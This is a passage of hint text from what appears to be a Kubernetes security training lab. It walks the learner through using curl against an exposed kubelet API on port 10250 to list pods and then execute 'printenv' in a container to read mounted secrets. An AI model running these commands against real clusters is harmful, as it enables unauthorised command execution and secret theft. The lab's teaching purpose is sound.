          some tools to get the information you need.

          Get the pod information from one of the nodes until you hit a good
          pod; curl -k https://<node-IP>:10250/pods What can you do with this
          information?
      - text: >-
          From the pod information you saw that there are some secrets mounted
          in the secret-pod. Can you run any commands in the pod?
      - text: >-
          Run the printenv command in the container you found; curl -k -XPOST
          "https://<node-ip>:10250/run/node-amphibious-operations/<pod
          name>/<container name>" -d "cmd=printenv" You will be able to find the
          pod and container name from the previous pods endpoint.
